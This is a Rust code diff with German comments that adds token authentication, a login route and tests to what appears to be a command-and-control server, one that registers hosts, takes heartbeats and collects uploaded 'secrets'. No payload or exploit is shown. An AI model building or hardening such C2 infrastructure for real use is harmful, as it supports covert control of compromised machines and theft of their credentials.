@@ -15,6 +15,7 @@ use std::sync::Arc;
 use axum::{
     extract::{Json, State},
     http::StatusCode,
+    middleware,
     response::{Html, IntoResponse},
     routing::{get, post},
     Router,
@@ -23,8 +24,8 @@ use axum_server::tls_rustls::RustlsConfig;
 use clap::Parser;
 use db::{Db, HostRow, SecretRow};
 use kx_core::c2::{
-    self, HeartbeatRequest, RegisterRequest, SecretUpload, PATH_HEARTBEAT, PATH_HOSTS,
-    PATH_REGISTER, PATH_SECRETS, PATH_TASKS,
+    self, HeartbeatRequest, LoginRequest, RegisterRequest, SecretUpload, PATH_HEARTBEAT,
+    PATH_HOSTS, PATH_LOGIN, PATH_REGISTER, PATH_SECRETS, PATH_TASKS,
 };
 use uuid::Uuid;
 
@@ -56,11 +57,13 @@ struct Cli {
     cn: String,
 }
 
-/// Server-Zustand: Datenbank und Auth-Token.
+/// Server-Zustand: Datenbank.
+///
+/// Das Auth-Token steht hier nicht mehr: es wird prozessweit in
+/// `KX_SERVER_TOKEN` gehalten und von der Auth-Middleware gelesen.
 #[derive(Clone)]
 struct AppState {
     db: Arc<Db>,
-    token: String,
 }
 
 /// Registriert einen Host. Die Host-ID kommt aus dem Request — der Server leitet
@@ -168,9 +171,29 @@ async fn list_tasks(State(st): State<AppState>) -> impl IntoResponse {
     }
 }
 
-/// Liefert das HTML-Dashboard (ohne Auth, Token via URL-Parameter).
+/// Liefert das HTML-Dashboard (ohne Auth).
+///
+/// Das HTML enthält keine Geheimnisse — die Daten holt sich das JavaScript
+/// selbst per `fetch` mit `Authorization`-Header, und genau dieser `fetch`
+/// läuft in einen geschützten Pfad. Ohne Anmeldung bleiben die Tabellen leer.
 async fn dashboard() -> impl IntoResponse {
     Html(dashboard::DASHBOARD_HTML)
+}
+
+/// Prüft ein vom Dashboard gesendetes Token.
+///
+/// Der Pfad ist bewusst **nicht** durch die Auth-Middleware geschützt: er
+/// prüft das Token, das er entgegennimmt. Er gehört deshalb nicht in den
+/// geschützten API-Subrouter, sondern daneben.
+///
+/// Der Vergleich ist constant-time (siehe `auth::verify`).
+async fn login(Json(req): Json<LoginRequest>) -> impl IntoResponse {
+    let expected = std::env::var("KX_SERVER_TOKEN").unwrap_or_default();
+    if auth::verify_token(&req.token, &expected) {
+        StatusCode::OK.into_response()
+    } else {
+        (StatusCode::UNAUTHORIZED, "unauthorized: falsches Token").into_response()
+    }
 }
 
 #[tokio::main]
@@ -191,7 +214,13 @@ async fn main() {
         .or_else(|| std::env::var("KX_SERVER_TOKEN").ok())
         .unwrap_or_else(|| Uuid::new_v4().to_string());
     if !cli_token_provided {
-        eprintln!("Kx-Server: kein Token gesetzt, verwende generiertes: {token}");
+        // Der Tokenwert wird NICHT ausgegeben. Die API ist ab jetzt
+        // authentifiziert, ein Token im stderr landet in Logs und im
+        // Terminal-Scrollback — dort gehört er nicht hin. Der Wert bleibt
+        // über KX_SERVER_TOKEN abrufbar.
+        eprintln!(
+            "Kx-Server: kein Token gesetzt, generiertes Token wird in KX_SERVER_TOKEN gesetzt"
+        );
     }
     // auth.rs liest das Token aus der Environment-Variable.
     std::env::set_var("KX_SERVER_TOKEN", &token);
@@ -199,7 +228,6 @@ async fn main() {
     let db = Db::open(&cli.db).expect("Datenbank nicht erreichbar");
     let state = AppState {
         db: Arc::new(db),
-        token: token.clone(),
     };
 
     // TLS-Material: selbstsigniert generieren.
@@ -207,14 +235,31 @@ async fn main() {
     let cert_pem = tls.cert_pem.clone();
     let key_pem = tls.key_pem;
 
-    let app = Router::new()
-        .route("/", get(dashboard))
+    // Der API-Router trägt alle fünf Vertragspfade und ist per `route_layer`
+    // geschützt. Der Dashboard-Router (`GET /`) bleibt getrennt: das Dashboard
+    // liefert nur HTML, die Daten holt es sich selbst per `fetch` mit
+    // Authorization-Header — und genau dieser `fetch` läuft in einen
+    // geschützten Pfad.
+    //
+    // REIHENFOLGE: alle Routen zuerst, dann `route_layer`. Axum wendet den
+    // Layer nur auf die zum Aufrufzeitpunkt bereits registrierten Routen an —
+    // eine danach hinzugefügte Route bliebe ungeschützt.
+    let api = Router::new()
         .route(PATH_REGISTER, post(register))
         .route(PATH_HEARTBEAT, post(heartbeat))
         .route(PATH_SECRETS, post(upload_secret))
         .route(PATH_HOSTS, get(list_hosts))
         .route(PATH_SECRETS, get(list_secrets))
         .route(PATH_TASKS, get(list_tasks))
+        .route_layer(middleware::from_fn(auth::require_auth));
+
+    // Der Login-Pfad steht neben dem geschützten API-Router, nicht darin:
+    // er prüft das Token, das er entgegennimmt, und würde sich sonst selbst
+    // blockieren.
+    let app = Router::new()
+        .route("/", get(dashboard))
+        .route(PATH_LOGIN, post(login))
+        .merge(api)
         .with_state(state);
 
     let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
@@ -280,5 +325,160 @@ mod tests {
             assert!(debug.contains(path), "der Router registriert {path} nicht");
         }
     }
+
+    /// Der Auth-Test, der gefehlt hat: ohne Token muss jeder Vertragspfad 401
+    /// liefern, mit falschem ebenso, mit korrektem 200.
+    ///
+    /// Vor diesem Fix gab es keinen Auth-Test, und die Routen waren offen.
+    #[tokio::test]
+    async fn api_paths_require_a_valid_bearer_token() {
+        // Das Token kommt prozessweit aus der Environment-Variable.
+        std::env::set_var("KX_SERVER_TOKEN", "test-token");
+        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-auth-test.db")).expect("db"));
+        let state = AppState { db };
+
+        let api = Router::new()
+            .route(PATH_REGISTER, post(register))
+            .route(PATH_HEARTBEAT, post(heartbeat))
+            .route(PATH_SECRETS, post(upload_secret))
+            .route(PATH_HOSTS, get(list_hosts))
+            .route(PATH_SECRETS, get(list_secrets))
+            .route(PATH_TASKS, get(list_tasks))
+            .route_layer(middleware::from_fn(auth::require_auth));
+        let app = Router::new().route("/", get(dashboard)).merge(api).with_state(state);
+
+        for path in [
+            PATH_REGISTER,
+            PATH_HEARTBEAT,
+            PATH_SECRETS,
+            PATH_HOSTS,
+            PATH_TASKS,
+        ] {
+            // Ohne Token.
+            let res = app
+                .clone()
+                .oneshot(
+                    Request::builder()
+                        .uri(path)
+                        .body(axum::body::Body::empty())
+                        .unwrap(),
+                )
+                .await
+                .unwrap();
+            assert_eq!(
+                res.status(),
+                StatusCode::UNAUTHORIZED,
+                "{path} ist ohne Token nicht abgewiesen worden"
+            );
+
+            // Mit falschem Token.
+            let res = app
+                .clone()
+                .oneshot(
+                    Request::builder()
+                        .uri(path)
+                        .header("authorization", "Bearer falsch")
+                        .body(axum::body::Body::empty())
+                        .unwrap(),
+                )
+                .await
+                .unwrap();
+            assert_eq!(
+                res.status(),
+                StatusCode::UNAUTHORIZED,
+                "{path} ist mit falschem Token nicht abgewiesen worden"
+            );
+        }
+
+        // Mit korrektem Token wird der Handler erreicht.
+        let res = app
+            .oneshot(
+                Request::builder()
+                    .uri(PATH_HOSTS)
+                    .header("authorization", "Bearer test-token")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(res.status(), StatusCode::OK);
+    }
+
+    /// Ein unbekannter Pfad liefert 404, nicht 401 — die Middleware läuft nur,
+    /// wenn die Anfrage auf eine Route trifft. Sonst verriete der Server, ob
+    /// ein Pfad existiert.
+    #[tokio::test]
+    async fn unknown_path_is_404_not_401() {
+        std::env::set_var("KX_SERVER_TOKEN", "test-token");
+        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-404-test.db")).expect("db"));
+        let state = AppState { db };
+
+        let api = Router::new()
+            .route(PATH_HOSTS, get(list_hosts))
+            .route_layer(middleware::from_fn(auth::require_auth));
+        let app = Router::new().route("/", get(dashboard)).merge(api).with_state(state);
+
+        let res = app
+            .oneshot(
+                Request::builder()
+                    .uri("/api/gibtsnicht")
+                    .body(axum::body::Body::empty())
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(res.status(), StatusCode::NOT_FOUND);
+    }
+
+    /// Der Login-Pfad prüft das Token, das er entgegennimmt: korrekt → 200,
+    /// falsch → 401. Er steht bewusst neben dem geschützten API-Router.
+    #[tokio::test]
+    async fn login_path_checks_the_token_it_receives() {
+        std::env::set_var("KX_SERVER_TOKEN", "test-token");
+        let db = Arc::new(Db::open(&std::env::temp_dir().join("kx-login-test.db")).expect("db"));
+        let state = AppState { db };
+
+        let api = Router::new()
+            .route(PATH_HOSTS, get(list_hosts))
+            .route_layer(middleware::from_fn(auth::require_auth));
+        let app = Router::new()
+            .route("/", get(dashboard))
+            .route(PATH_LOGIN, post(login))
+            .merge(api)
+            .with_state(state);
+
+        // Falsches Token → 401.
+        let res = app
+            .clone()
+            .oneshot(
+                Request::builder()
+                    .method("POST")
+                    .uri(PATH_LOGIN)
+                    .header("content-type", "application/json")
+                    .body(Body::from(r#"{"token":"falsch"}"#))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(res.status(), StatusCode::UNAUTHORIZED);
+
+        // Korrektes Token → 200.
+        let res = app
+            .oneshot(
+                Request::builder()
+                    .method("POST")
+                    .uri(PATH_LOGIN)
+                    .header("content-type", "application/json")
+                    .body(Body::from(r#"{"token":"test-token"}"#))
+                    .unwrap(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(res.status(), StatusCode::OK);
+    }
+
+    use axum::body::Body;
+    use axum::extract::Request;
+    use tower::ServiceExt;
 }
 
